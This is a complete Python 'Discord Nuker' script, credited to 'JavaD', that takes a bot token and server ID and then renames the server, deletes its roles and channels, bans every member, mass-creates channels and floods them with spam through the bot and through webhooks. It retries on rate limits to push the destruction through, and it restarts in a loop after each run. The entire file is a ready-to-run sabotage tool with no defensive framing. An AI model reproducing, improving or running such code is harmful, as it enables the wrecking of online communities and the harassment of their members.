import asyncio
import aiohttp
import os
import time
from datetime import datetime
from pystyle import Colors, Colorate, Center

async def change_server_name(session):
    new_name = input(Colorate.Horizontal(Colors.blue_to_cyan, " [$] Enter New Server Name >> "))
    async with session.patch(
        f'https://discord.com/api/v9/guilds/{guild_id}',
        headers=headers,
        json={"name": new_name},
    ) as r:
        if r.status in [200, 201, 204]:
            print(Colorate.Horizontal(Colors.blue_to_cyan, f" [$] Server name changed to >> [{new_name}]"))
        elif r.status == 429:
            print(Colorate.Horizontal(Colors.red_to_white, " [$] Rate-limited while changing server name. Retrying..."))
        else:
            print(Colorate.Horizontal(Colors.red_to_white, f" [$] Failed to change server name. Status: {r.status}"))
    await asyncio.sleep(2)

async def delete_roles(session):
    async with session.get(f'https://discord.com/api/v9/guilds/{guild_id}/roles', headers=headers) as r:
        roles = await r.json()

    bot_role_id = None

    async with session.get(f'https://discord.com/api/v9/guilds/{guild_id}/members/{guild_id}', headers=headers) as r:
        if r.status == 200:
            member_data = await r.json()
            if 'roles' in member_data:
                for role in member_data['roles']:
                    if role == '@bot_role_id': 
                        bot_role_id = role
                        break

    for role in roles:
        role_id = role['id']

        if role_id == bot_role_id or role_id == "@everyone":
            continue
        
        while True:
            async with session.delete(f'https://discord.com/api/v9/guilds/{guild_id}/roles/{role_id}', headers=headers) as r:
                if r.status == 429:
                    retry_after = (await r.json())['retry_after']
                    await asyncio.sleep(retry_after)
                elif r.status in [200, 201, 204]:
                    print(Colorate.Horizontal(Colors.blue_to_cyan, f" [$] Role Deleted >> {role['name']}"))
                    break
                else:
                    break
            await asyncio.sleep(0.2)

async def ban_all_members(session):
    # Retrieve the bot's own ID from the /users/@me endpoint
    bot_id = None
    async with session.get('https://discord.com/api/v9/users/@me', headers=headers) as r:
        if r.status == 200:
            bot_data = await r.json()
            bot_id = bot_data['id']
        else:
            print(Colorate.Horizontal(Colors.red_to_white, " [$] Failed to retrieve bot's ID!"))
            print(f" [$] Response Status: {r.status}")
            print(f" [$] Response Data: {await r.text()}")
            return

    members = []
    after = "0"  # Start after "0" to get all members
    while True:
        url = f'https://discord.com/api/v9/guilds/{guild_id}/members?limit=1000&after={after}'
        async with session.get(url, headers=headers) as r:
            if r.status != 200:
                print(Colorate.Horizontal(Colors.red_to_white, f" [$] Failed to retrieve members! Status: {r.status}"))
                break
            data = await r.json()
            if not data:
                break  # No more members to fetch
            members.extend(data)
            after = data[-1]['user']['id']  # Set "after" to the last user's ID
            if len(data) < 1000:  # If fewer than 1000 members were returned, we have reached the end
                break

    print(Colorate.Horizontal(Colors.blue_to_cyan, f" [$] Found {len(members)} members to ban."))

    # Ban each member (skip the bot itself)
    for member in members:
        member_id = member['user']['id']
        if member_id == bot_id:
            continue

        while True:
            async with session.put(
                f'https://discord.com/api/v9/guilds/{guild_id}/bans/{member_id}',
                headers=headers,
                json={},
            ) as r:
                if r.status == 429:  # Rate limited, wait and retry
                    retry_after = (await r.json())['retry_after']
                    print(Colorate.Horizontal(Colors.red_to_white, f" [$] Rate-limited! Retrying in {retry_after}s >> {member_id}"))
                    await asyncio.sleep(retry_after)
                elif r.status in [200, 201, 204]:
                    print(Colorate.Horizontal(Colors.blue_to_cyan, f" [$] Banned User >> {member['user']['username']}"))
                    break
                else:
                    print(Colorate.Horizontal(Colors.red_to_white, f" [$] Failed to ban user >> {member['user']['username']} (Status: {r.status})"))
                    break
            await asyncio.sleep(0.2)


async def delete_channels(session):
    async with session.get(f'https://discord.com/api/v9/guilds/{guild_id}/channels', headers=headers) as r:
        channels = await r.json()

    for channel in channels:
        channel_id = channel['id']
        while True:
            async with session.delete(f'https://discord.com/api/v9/channels/{channel_id}', headers=headers) as r:
                if r.status == 429:
                    retry_after = (await r.json())['retry_after']
                    print(Colorate.Horizontal(Colors.red_to_white, f" [$] Rate-limited! Retrying in {retry_after}s >> {channel_id}"))
                    await asyncio.sleep(retry_after)
                elif r.status in [200, 201, 204]:
                    print(Colorate.Horizontal(Colors.blue_to_cyan, f" [$] Channel Deleted >> {channel_id}"))
                    break
                else:
                    print(Colorate.Horizontal(Colors.red_to_white, f" [$] Failed to delete channel >> {channel_id} (Status: {r.status})"))
                    break
            await asyncio.sleep(0.2)

async def create_channels(session):
    channel_name = input(Colorate.Horizontal(Colors.blue_to_cyan, " [$] Enter Channel Name >> "))
    num_channels = int(input(Colorate.Horizontal(Colors.blue_to_cyan, " [$] Enter Number of Channels to Create >> ")))


    async def create_channel():
        while True:
            async with session.post(
                f'https://discord.com/api/v9/guilds/{guild_id}/channels',
                headers=headers,
                json={'name': channel_name, 'type': 0},
            ) as r:
                if r.status == 429:
                    retry_after = (await r.json())['retry_after']
                    print(Colorate.Horizontal(Colors.red_to_white, f" [$] Rate-limited! Retrying in {retry_after}s"))
                    await asyncio.sleep(retry_after)
                elif r.status in [200, 201, 204]:
                    print(Colorate.Horizontal(Colors.blue_to_cyan, f" [$] Channel Created >> {channel_name}"))
                    break
                else:
                    print(Colorate.Horizontal(Colors.red_to_white, f" [$] Failed to create channel (Status: {r.status})"))
                    break
        await asyncio.sleep(0.05) 

    await asyncio.gather(*[create_channel() for _ in range(num_channels)])

async def direct_spam(session):
    msg = input(Colorate.Horizontal(Colors.blue_to_cyan, " [$] Enter Message to Spam >> "))
    msg_amt = int(input(Colorate.Horizontal(Colors.blue_to_cyan, " [$] Enter Number of Messages Per Channel >> ")))


    async with session.get(f'https://discord.com/api/v9/guilds/{guild_id}/channels', headers=headers) as r:
        channels = await r.json()

    async def bot_spam_channel(channel_id):
        for _ in range(msg_amt):
            async with session.post(
                f'https://discord.com/api/v9/channels/{channel_id}/messages',
                headers=headers,
                json={'content': msg},
            ) as r:
                if r.status == 429:
                    retry_after = (await r.json())['retry_after']
                    print(Colorate.Horizontal(Colors.red_to_white, f" [$] Rate-limited! Retrying in {retry_after}s..."))
                    await asyncio.sleep(retry_after)
                elif r.status in [200, 201, 204]:
                    print(Colorate.Horizontal(Colors.blue_to_cyan, f" [$] Message Sent in Channel >> {channel_id}"))
                else:
                    print(Colorate.Horizontal(Colors.red_to_white, f" [$] Failed to send message in {channel_id} (Status: {r.status})"))
            await asyncio.sleep(0.2)

    async def webhook_spam_channel(channel_id):
        async with session.post(
            f'https://discord.com/api/v9/channels/{channel_id}/webhooks',
            headers=headers,
            json={'name': "SpamWebhook"},
        ) as r:
            if r.status == 429:
                retry_after = (await r.json())['retry_after']
                print(Colorate.Horizontal(Colors.red_to_white, f" [$] Rate-limited while creating webhook! Retrying in {retry_after}s..."))
                await asyncio.sleep(retry_after)
            elif r.status in [200, 201, 204]:
                webhook_raw = await r.json()
                webhook_url = f'https://discord.com/api/webhooks/{webhook_raw["id"]}/{webhook_raw["token"]}'
                for _ in range(msg_amt):
                    async with session.post(
                        webhook_url,
                        json={'content': msg},
                    ) as r:
                        if r.status == 429:
                            retry_after = (await r.json())['retry_after']
                            print(Colorate.Horizontal(Colors.red_to_white, f" [$] Rate-limited! Retrying in {retry_after}s..."))
                            await asyncio.sleep(retry_after)
                        elif r.status in [200, 201, 204]:
                            print(Colorate.Horizontal(Colors.blue_to_cyan, f" [$] Message Sent in Channel >> {channel_id}"))
                        else:
                            print(Colorate.Horizontal(Colors.red_to_white, f" [$] Failed to send message in {channel_id} (Status: {r.status})"))
                    await asyncio.sleep(0.2) 

    tasks = []
    for channel in channels:
        if channel['type'] == 0:
            tasks.append(asyncio.gather(
                bot_spam_channel(channel['id']),
                webhook_spam_channel(channel['id'])
            ))

    await asyncio.gather(*tasks)

async def main():
    global headers, guild_id
    token = input(Colorate.Horizontal(Colors.blue_to_cyan, " [$] Enter Your Bot Token > "))
    guild_id = input(Colorate.Horizontal(Colors.blue_to_cyan, " [$] Enter Your Guild ID > "))
    name = input(Colorate.Horizontal(Colors.blue_to_cyan, " [$] Enter Your Username > "))

    os.system(f'title ^| • JavaD ^| • User: {name} ^| • TeamSpeak: bt69.ir ^|')
    headers = {
        "Authorization": f"Bot {token}",
        "Content-Type": "application/json"
    }
    os.system('cls' if os.name == 'nt' else 'clear')

    while True:
        print(Colorate.Horizontal(Colors.blue_to_cyan,(r"""
________________________________________________________________________________________________________________________

 Devloped by : JavaD                       TeamSpeak: bt69.ir                                Discord Nuker V1
________________________________________________________________________________________________________________________
                                               
                                         ▀████▀                          ▀███▀▀▀██▄  
                                           ██                              ██    ▀██▄
                                           ██  ▄█▀██▄ ▀██▀   ▀██▀ ▄█▀██▄   ██     ▀██
                                           ██ ██   ██   ██   ▄█  ██   ██   ██      ██
                                           ██  ▄█████    ██ ▄█    ▄█████   ██     ▄██
                                      ███  ██ ██   ██     ███    ██   ██   ██    ▄██▀
                                       █████  ▀████▀██▄    █     ▀████▀██▄████████▀ 
                                               
                                               
                                 
________________________________________________________________________________________________________________________
    
""")))

        start_time = time.time()
        input(Colorate.Horizontal(Colors.blue_to_cyan, " [$] Press Enter To Start Nuking > "))

        async with aiohttp.ClientSession() as session:
            await change_server_name(session)
            await delete_roles(session) 
            await ban_all_members(session)
            await delete_channels(session)
            await create_channels(session)
            await direct_spam(session)

        end_time = time.time()
        elapsed_time = round(end_time - start_time, 2)

        os.system(f'title ^| • JavaD ^| Nuker ^| User: {name} ^| Version : 1.0 ^| Time Elapsed: {elapsed_time} Seconds ^|')
        print(Colorate.Horizontal(Colors.green_to_cyan, " [$] Nuke Completed! Restarting..."))
        time.sleep(5)
        os.system('cls' if os.name == 'nt' else 'clear')

asyncio.run(main())
